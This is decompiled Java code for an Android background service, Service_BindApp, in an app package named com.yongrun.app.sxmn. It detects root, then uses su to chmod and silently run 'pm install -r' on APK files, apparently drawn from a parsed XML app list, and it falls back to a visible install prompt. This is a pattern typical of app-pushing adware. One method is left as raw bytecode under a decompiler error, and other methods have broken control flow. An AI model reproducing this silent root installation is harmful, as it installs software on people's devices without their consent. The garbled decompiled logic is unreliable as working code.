package com.yongrun.app.sxmn.service;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.IBinder;
import java.io.DataOutputStream;
import java.io.File;
import java.io.OutputStream;
import java.io.PrintStream;
import java.util.ArrayList;
import java.util.List;

public class Service_BindApp
  extends Service
{
  public Service_BindApp() {}
  
  public void a(File paramFile)
  {
    Intent localIntent = new Intent("android.intent.action.VIEW");
    localIntent.setDataAndType(Uri.fromFile(paramFile), "application/vnd.android.package-archive");
    localIntent.setFlags(268435456);
    startActivity(localIntent);
  }
  
  public boolean a()
  {
    try
    {
      if (!new File("/system/bin/su").exists())
      {
        boolean bool = new File("/system/xbin/su").exists();
        if (!bool) {
          return false;
        }
      }
      return true;
    }
    catch (Exception localException) {}
    return false;
  }
  
  public boolean a(File paramFile, boolean paramBoolean)
  {
    paramBoolean = true;
    System.out.println(paramFile.getPath());
    System.out.println(paramFile.getPath() + "==");
    try
    {
      Process localProcess = Runtime.getRuntime().exec("su");
      OutputStream localOutputStream = localProcess.getOutputStream();
      DataOutputStream localDataOutputStream = new DataOutputStream(localOutputStream);
      localDataOutputStream.writeBytes("chmod 777 " + paramFile.getPath() + "\n");
      localDataOutputStream.writeBytes("LD_LIBRARY_PATH=/vendor/lib:/system/lib pm install -r " + paramFile.getPath());
      localDataOutputStream.flush();
      localDataOutputStream.close();
      localOutputStream.close();
      int i = localProcess.waitFor();
      if (i == 0) {}
      for (;;)
      {
        if (!paramBoolean) {
          a(paramFile);
        }
        return paramBoolean;
        if (i == 1) {
          paramBoolean = false;
        } else {
          paramBoolean = false;
        }
      }
      return false;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
      a(paramFile);
    }
  }
  
  public boolean a(String paramString)
  {
    List localList = getPackageManager().getInstalledPackages(0);
    ArrayList localArrayList = new ArrayList();
    int i;
    if (localList != null) {
      i = 0;
    }
    for (;;)
    {
      if (i >= localList.size()) {
        return localArrayList.contains(paramString);
      }
      localArrayList.add(((PackageInfo)localList.get(i)).packageName);
      i += 1;
    }
  }
  
  /* Error */
  public List<com.yongrun.app.sxmn.c.a> b()
  {
    // Byte code:
    //   0: new 176	com/yongrun/app/sxmn/a
    //   3: dup
    //   4: invokespecial 177	com/yongrun/app/sxmn/a:<init>	()V
    //   7: astore_3
    //   8: new 149	java/util/ArrayList
    //   11: dup
    //   12: invokespecial 150	java/util/ArrayList:<init>	()V
    //   15: astore 4
    //   17: aload_0
    //   18: ldc -77
    //   20: iconst_0
    //   21: invokevirtual 183	com/yongrun/app/sxmn/service/Service_BindApp:getSharedPreferences	(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    //   24: ldc -71
    //   26: ldc -69
    //   28: invokeinterface 193 3 0
    //   33: astore 5
    //   35: invokestatic 198	com/yongrun/app/sxmn/common/b:a	()Lcom/yongrun/app/sxmn/common/b;
    //   38: new 70	java/lang/StringBuilder
    //   41: dup
    //   42: ldc -56
    //   44: invokespecial 77	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   47: aload 5
    //   49: invokevirtual 83	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   52: invokevirtual 86	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   55: invokevirtual 203	com/yongrun/app/sxmn/common/b:a	(Ljava/lang/String;)Ljava/lang/String;
    //   58: astore 5
    //   60: aload 5
    //   62: ifnull +56 -> 118
    //   65: new 205	org/xml/sax/InputSource
    //   68: dup
    //   69: new 207	java/io/StringReader
    //   72: dup
    //   73: aload 5
    //   75: invokespecial 208	java/io/StringReader:<init>	(Ljava/lang/String;)V
    //   78: invokespecial 211	org/xml/sax/InputSource:<init>	(Ljava/io/Reader;)V
    //   81: astore 5
    //   83: invokestatic 217	javax/xml/parsers/DocumentBuilderFactory:newInstance	()Ljavax/xml/parsers/DocumentBuilderFactory;
    //   86: invokevirtual 221	javax/xml/parsers/DocumentBuilderFactory:newDocumentBuilder	()Ljavax/xml/parsers/DocumentBuilder;
    //   89: aload 5
    //   91: invokevirtual 227	javax/xml/parsers/DocumentBuilder:parse	(Lorg/xml/sax/InputSource;)Lorg/w3c/dom/Document;
    //   94: ldc -27
    //   96: invokeinterface 235 2 0
    //   101: astore 5
    //   103: iconst_0
    //   104: istore_1
    //   105: aload 5
    //   107: invokeinterface 240 1 0
    //   112: istore_2
    //   113: iload_1
    //   114: iload_2
    //   115: if_icmplt +10 -> 125
    //   118: aload_3
    //   119: invokevirtual 242	com/yongrun/app/sxmn/a:a	()V
    //   122: aload 4
    //   124: areturn
    //   125: aload 5
    //   127: iload_1
    //   128: invokeinterface 246 2 0
    //   133: checkcast 248	org/w3c/dom/Element
    //   136: ldc -6
    //   138: invokeinterface 251 2 0
    //   143: iconst_0
    //   144: invokeinterface 246 2 0
    //   149: invokeinterface 257 1 0
    //   154: invokeinterface 260 1 0
    //   159: astore 6
    //   161: aload 5
    //   163: iload_1
    //   164: invokeinterface 246 2 0
    //   169: checkcast 248	org/w3c/dom/Element
    //   172: ldc_w 262
    //   175: invokeinterface 251 2 0
    //   180: iconst_0
    //   181: invokeinterface 246 2 0
    //   186: invokeinterface 257 1 0
    //   191: invokeinterface 260 1 0
    //   196: astore 7
    //   198: aload 5
    //   200: iload_1
    //   201: invokeinterface 246 2 0
    //   206: checkcast 248	org/w3c/dom/Element
    //   209: ldc_w 264
    //   212: invokeinterface 251 2 0
    //   217: iconst_0
    //   218: invokeinterface 246 2 0
    //   223: invokeinterface 257 1 0
    //   228: invokeinterface 260 1 0
    //   233: astore 8
    //   235: aload 5
    //   237: iload_1
    //   238: invokeinterface 246 2 0
    //   243: checkcast 248	org/w3c/dom/Element
    //   246: ldc_w 266
    //   249: invokeinterface 251 2 0
    //   254: iconst_0
    //   255: invokeinterface 246 2 0
    //   260: invokeinterface 257 1 0
    //   265: invokeinterface 260 1 0
    //   270: astore 9
    //   272: aload 5
    //   274: iload_1
    //   275: invokeinterface 246 2 0
    //   280: checkcast 248	org/w3c/dom/Element
    //   283: ldc_w 268
    //   286: invokeinterface 251 2 0
    //   291: iconst_0
    //   292: invokeinterface 246 2 0
    //   297: invokeinterface 257 1 0
    //   302: invokeinterface 260 1 0
    //   307: astore 10
    //   309: new 270	com/yongrun/app/sxmn/c/a
    //   312: dup
    //   313: invokespecial 271	com/yongrun/app/sxmn/c/a:<init>	()V
    //   316: astore 11
    //   318: aload 11
    //   320: aload 7
    //   322: invokevirtual 274	com/yongrun/app/sxmn/c/a:d	(Ljava/lang/String;)V
    //   325: aload 11
    //   327: aload 6
    //   329: invokevirtual 276	com/yongrun/app/sxmn/c/a:a	(Ljava/lang/String;)V
    //   332: aload 11
    //   334: aload 8
    //   336: invokevirtual 279	com/yongrun/app/sxmn/c/a:c	(Ljava/lang/String;)V
    //   339: aload 11
    //   341: aload 10
    //   343: invokevirtual 281	com/yongrun/app/sxmn/c/a:b	(Ljava/lang/String;)V
    //   346: aload 11
    //   348: aload 9
    //   350: invokevirtual 284	com/yongrun/app/sxmn/c/a:e	(Ljava/lang/String;)V
    //   353: aload 4
    //   355: aload 11
    //   357: invokeinterface 172 2 0
    //   362: pop
    //   363: iload_1
    //   364: iconst_1
    //   365: iadd
    //   366: istore_1
    //   367: goto -262 -> 105
    //   370: astore 4
    //   372: new 149	java/util/ArrayList
    //   375: dup
    //   376: invokespecial 150	java/util/ArrayList:<init>	()V
    //   379: astore 5
    //   381: aload 4
    //   383: invokevirtual 136	java/lang/Exception:printStackTrace	()V
    //   386: aload_3
    //   387: invokevirtual 242	com/yongrun/app/sxmn/a:a	()V
    //   390: aload 5
    //   392: areturn
    //   393: astore 4
    //   395: aload_3
    //   396: invokevirtual 242	com/yongrun/app/sxmn/a:a	()V
    //   399: aload 4
    //   401: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	402	0	this	Service_BindApp
    //   104	263	1	i	int
    //   112	4	2	j	int
    //   7	389	3	localA	com.yongrun.app.sxmn.a
    //   15	339	4	localArrayList	ArrayList
    //   370	12	4	localException	Exception
    //   393	7	4	localObject1	Object
    //   33	358	5	localObject2	Object
    //   159	169	6	str1	String
    //   196	125	7	str2	String
    //   233	102	8	str3	String
    //   270	79	9	str4	String
    //   307	35	10	str5	String
    //   316	40	11	localA1	com.yongrun.app.sxmn.c.a
    // Exception table:
    //   from	to	target	type
    //   17	60	370	java/lang/Exception
    //   65	103	370	java/lang/Exception
    //   105	113	370	java/lang/Exception
    //   125	363	370	java/lang/Exception
    //   17	60	393	finally
    //   65	103	393	finally
    //   105	113	393	finally
    //   125	363	393	finally
    //   372	386	393	finally
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    new Thread(new a(this, com.yongrun.app.sxmn.common.a.a())).start();
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    return super.onStartCommand(paramIntent, paramInt1, paramInt2);
  }
}
